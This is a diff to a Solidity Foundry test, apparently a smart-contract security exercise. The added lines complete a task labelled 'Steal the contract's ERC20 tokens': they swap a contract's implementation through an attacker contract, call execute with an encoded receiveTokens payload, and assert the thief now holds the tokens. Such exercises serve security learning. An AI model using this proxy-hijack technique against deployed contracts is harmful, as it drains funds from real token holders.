@@ -2,6 +2,7 @@
 pragma solidity ^0.8.13;
 
 import "../lib/forge-std/src/Test.sol";
+import "../lib/forge-std/src/console.sol";
 import {FungibleToken} from "./FungibleToken.sol";
 import {NFT} from "./NFT.sol";
 
@@ -114,8 +115,20 @@ contract QuestionsTest is Test {
         Solution6 thief = new Solution6();
 
         // TODO: Steal the contract's ERC20 tokens
+        bytes memory data = abi.encodeWithSignature(
+            "receiveTokens(address,address)",
+            address(erc20),
+            address(thief)
+        );
+        console.log(question6.implementation());
         thief.attack(address(question6));
+        console.log(question6.implementation());
 
+        question6.execute(data);
+      
+
+        
+        assertEq(erc20.balanceOf(address(thief)), 1 ether);
         // thief.receiveTokens(address(erc20),1 ether);
     }
 
